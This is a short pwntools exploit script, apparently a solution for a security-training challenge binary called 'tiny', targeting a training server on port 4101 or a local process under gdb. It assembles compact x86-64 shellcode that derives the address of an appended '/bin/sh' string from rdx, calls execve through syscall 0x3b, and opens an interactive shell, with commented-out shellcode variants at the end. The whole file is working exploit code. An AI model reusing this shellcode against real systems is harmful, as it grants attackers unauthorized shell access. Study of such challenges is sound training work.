from pwn import *

context.update(arch='amd64', os='linux')
context.terminal=['tmux','splitw','-h']

# call rdx

shell="""
push rdx
pop rax
add al,0x11
push rax
pop rdi
push 0x3b
pop rax
push 0x0
pop rsi
push 0x0
pop rdx
syscall
"""
shell=asm(shell)+b"/bin/sh\x00"

if "REMOTE" in args:

    p=remote("bin.training.offdef.it", 4101)

else:
    p=process("./tiny")
    gdb.attach(p,"""
    
    """)

input("wait")


p.send(shell)

p.interactive()


#push 0x3b
#pop rax
#push 0x0
#pop rsi
#push 0x0
#pop rdx
#push 0x0
#pop rdi
#add rdi, 0x12
#syscall

#push rdx
#pop rax
#add al,0x11
#push rax
#pop rdi
#push 0x3b
#pop rax
#push 0x0
#pop rsi
#push 0x0
#pop rdx
#syscall
#.byte "/bin/sh\"
